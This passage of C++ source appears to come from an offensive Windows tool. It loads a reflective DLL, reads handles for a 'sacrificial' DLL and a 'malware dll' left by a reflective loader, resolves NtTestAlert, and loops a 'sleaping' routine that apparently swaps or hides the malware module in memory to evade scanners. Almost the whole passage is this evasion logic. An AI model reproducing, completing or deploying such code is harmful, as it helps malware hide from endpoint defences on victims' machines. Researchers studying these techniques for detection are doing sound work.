        std::filesystem::path absolute_path = std::filesystem::absolute(file_path);
        std::ifstream file(absolute_path, std::ios::binary | std::ios::ate);
        if (!file)
        {
            std::cout << "[-] Cannot open file: " << absolute_path << std::endl;
            return buffer;
        }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);

        buffer.resize(size);
        if (!file.read(buffer.data(), size)) {
            std::cout << "[-] Error reading file: " << absolute_path << std::endl;
            buffer.clear();
            return buffer;
        }

        std::cout << "[+] Successfully loaded " << size << " bytes from: " << absolute_path << std::endl;

    }
    catch (const std::exception& e)
    {
        std::cout << "[-] Exception: " << e.what() << std::endl;
    }

    return buffer;
}

int main(void) 
{

    char rfl_dll_name[] = "D:\\files\\projects\\ReflectiveDLL\\x64\\Release\\Reflective.dll";
    HMODULE rfl_dll = LoadLibraryA(rfl_dll_name);

    std::string filePath = "D:\\files\\projects\\ReflectiveDLL\\x64\\Debug\\test.exe";

    std::vector<char> pefile = load_local_file(filePath);
    moduleBase = pefile.data();

    _123321_asdf21425();
    PSAC_DLL_HEADER sac_dll_header = NULL;

    // even if unmapped it's in the PEB
    PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
    if (sac_dll_base == NULL)
        return FALSE;

    sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;

    // retrieve the information left from the reflective loader
    HANDLE sac_dll_handle = sac_dll_header->sac_dll_handle;
    // retrieve handle of malware dll
    HANDLE mal_dll_handle = sac_dll_header->mal_dll_handle;
    SIZE_T sac_dll_size = sac_dll_header->payload_size;

    // PBYTE old_memory = (PBYTE)sac_dll_header->to_free;

    sac_dll_base = (PBYTE)(sac_dll_header + 1);

    // // remove the very first buffer allocated for the reflective dll
    // if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
    // {
    //     // error releasing old buffer
    //     return FALSE;
    // }

    // initialize all the NtFunctions
    NT_FUNCTIONS nt_func_s = { 0 };
    if (!init_nt_func_s(&nt_func_s))
    {
        return FALSE;
    }

    HMODULE hm_ntdll = { 0 };
    if (!(hm_ntdll = GetModuleHandleA("ntdll.dll")))
        return FALSE;

    PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
    if (NtTestAlert_addr == NULL)
        return FALSE;

    do
    {
        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
        if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
        {
            MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
            return FALSE;
        }

    } while (true);

	return 0;
}
